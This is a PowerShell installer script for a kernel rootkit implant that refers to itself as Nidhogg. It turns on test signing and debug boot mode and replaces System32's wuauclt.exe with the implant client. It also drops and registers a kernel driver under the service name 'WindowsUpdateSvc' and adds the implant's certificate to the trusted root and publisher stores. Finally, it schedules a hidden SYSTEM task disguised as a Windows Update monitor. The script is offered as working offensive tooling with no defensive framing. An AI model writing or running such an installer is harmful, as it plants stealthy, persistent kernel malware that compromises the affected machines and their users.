# Install_Implant_PreBoot.ps1 - FIXED version
$TargetDir = "C:\Windows\System32"

Write-Host "[+] Pre-Boot Installation Starting..." -ForegroundColor Cyan

# Unblock files first
Get-ChildItem . -Recurse | Unblock-File -ErrorAction SilentlyContinue

# === Enable Test Signing ===
if ((bcdedit /enum {current} | Select-String "testsigning") -match "No") {
    Write-Host "[+] Enabling Test Signing..." -ForegroundColor Yellow
    bcdedit /set testsigning on | Out-Null
    bcdedit /set debug on | Out-Null
}

# === Take Ownership + Full Permissions on target files ===
function Set-FullAccess {
    param($Path)
    if (Test-Path $Path) { Remove-Item $Path -Force -EA SilentlyContinue }
    $null = icacls $Path /grant Administrators:F /T 2>&1
}

Set-FullAccess "$TargetDir\wuauclt.exe"
Set-FullAccess "$TargetDir\Implant.ps1"
Set-FullAccess "$TargetDir\drivers\Nidhogg.sys"

# === Copy Files with elevated context ===
Copy-Item ".\NidhoggClient.exe" "$TargetDir\wuauclt.exe" -Force -ErrorAction Stop
Copy-Item ".\Implant.ps1"       "$TargetDir\Implant.ps1" -Force -ErrorAction Stop
if (Test-Path ".\Nidhogg.sys") {
    New-Item -ItemType Directory -Path "$TargetDir\drivers" -Force | Out-Null
    Copy-Item ".\Nidhogg.sys" "$TargetDir\drivers\Nidhogg.sys" -Force -ErrorAction Stop
}

Write-Host "[+] Files copied successfully" -ForegroundColor Green

# === Certificate ===
if (Test-Path ".\Nidhogg.cer") {
    $CertPath = "$env:TEMP\Nidhogg.cer"
    Copy-Item ".\Nidhogg.cer" $CertPath -Force
    certutil -addstore Root $CertPath | Out-Null
    certutil -addstore TrustedPublisher $CertPath | Out-Null
    Remove-Item $CertPath -Force -EA SilentlyContinue
}

# === Register Driver ===
sc.exe create "WindowsUpdateSvc" type= kernel start= auto binPath= "$TargetDir\drivers\Nidhogg.sys" | Out-Null

# === Post-Boot Task ===
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoP -NonI -W Hidden -ExecutionPolicy Bypass -File `"$TargetDir\Install_Implant_PostBoot.ps1`""

$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "Windows Update Health Monitor - PostBoot" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

Write-Host "`n=== Pre-Boot Phase Complete ===" -ForegroundColor Green
Write-Host "REBOOT the machine now!" -ForegroundColor Red